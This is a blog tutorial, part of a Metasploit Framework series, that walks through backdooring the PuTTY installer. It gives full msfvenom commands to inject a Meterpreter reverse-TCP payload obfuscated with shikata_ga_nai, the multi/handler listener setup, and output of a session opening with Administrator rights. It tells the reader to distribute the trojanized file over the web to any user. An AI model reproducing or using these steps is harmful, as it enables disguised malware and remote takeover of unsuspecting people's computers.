---
draft: false
title: MSF EXE Backdoor
linkTitle: MSF EXE Backdoor
translationKey: msf-exe-backdoor
date: 2017-06-16T14:00:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Creating a backdoor with an EXE file.
url: /msf-exe-backdoor/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
weight: 420
---
## Creating a Backdoor with an EXE File

Creating a special .exe file for a target computer and embedding codes in it can be really time-consuming. Instead, you can place Metasploit Payload modules inside an existing .exe file.

In this article, we will see how to place and encode a Metasploit Payload inside an .exe file. This will open a Meterpreter session on our computer from the computer of the user who runs the encoded special .exe file.

## Downloading an Exe File

In our example, we will use the file named `putty.exe`. First, let's download this file. Since we will distribute our encoded .exe file from the web page, let's go to the `/var/www/` folder where our server is located in Kali Linux and start the download with the following command.

```bash
root@kali:/var/www# wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
--2015-07-21 12:01:27--http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe

Resolving the.earth.li (the.earth.li)... 46.43.34.31, 2001:41c8:10:b1f:c0ff:ee:15:900d
Connecting to the.earth.li (the.earth.li)|46.43.34.31|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe
[following]
--2015-07-21 12:01:27--http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe
Reusing existing connection to the.earth.li:80.
HTTP request sent, awaiting response... 200 OK
Length: 524288 (512K) [application/x-msdos-program]
Saving to: `putty.exe'

100%[===================================================================================================>] 524,288 815K/s in 0.6s

2015-07-21 12:01:28 (815 KB/s) - `putty.exe' saved [524288/524288]

root@kali:/var/www#
```

Now, inside this downloaded `putty.exe` file, we will insert a Metasploit Payload module using the `msfvenom` command. The module we will insert is the `windows/meterpreter/reverse_tcp` module and we will set our own IP address 192.168.1.101 as the LHOST.

Next, we use msfvenom to inject a meterpreter reverse payload into our executable and encoded it 3 times using shikata_ga_nai and save the backdoored file into our web root directory.

```bash

root@kali:/var/www# msfvenom -a x86 –platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe -o puttyX.exe

Found 1 compatible encoders Attempting to encode payload with 3 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 326 (iteration=0) x86/shikata_ga_nai succeeded with size 353 (iteration=1) x86/shikata_ga_nai chosen with final size 380 Payload size: 380 bytes Saved as: puttyX.exe root@kali:/var/www#
```

When the process is completed successfully, we have an executable file named ```puttyX.exe``` with a payload inside.

Since the reverse payload is placed inside the .exe file, this payload will want to connect to our local computer. Then, we need to run a listener module in ```msfconsole``` so that the connection is possible.

For this, let's use the ```exploit/multi/handler``` module and make the necessary settings.

```bash
msf > use exploit/multi/handler

msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf exploit(handler) > set LHOST 192.168.1.101
LHOST => 192.168.1.101

msf exploit(handler) > set LPORT 443
LPORT => 443

msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.101:443
[*] Starting the payload handler...
```

Now the listening module is working. What needs to be done after this stage is to distribute the .exe file we created over the web. When any user runs this file, it will automatically connect to our local computer and open a Meterpreter session.

```bash
> Sending stage (749056 bytes) to 192.168.1.201
> Meterpreter session 1 opened (192.168.1.101:443 -> 192.168.1.201:1189) at Sat Feb 05 08:54:25 -0700 2011

meterpreter > getuid
Server username: XEN-XP-SPLOIT\Administrator
meterpreter >
```

The operations described in this article and the distribution of the .exe file may take longer than it seems. Only the logic of the process is tried to be explained here.
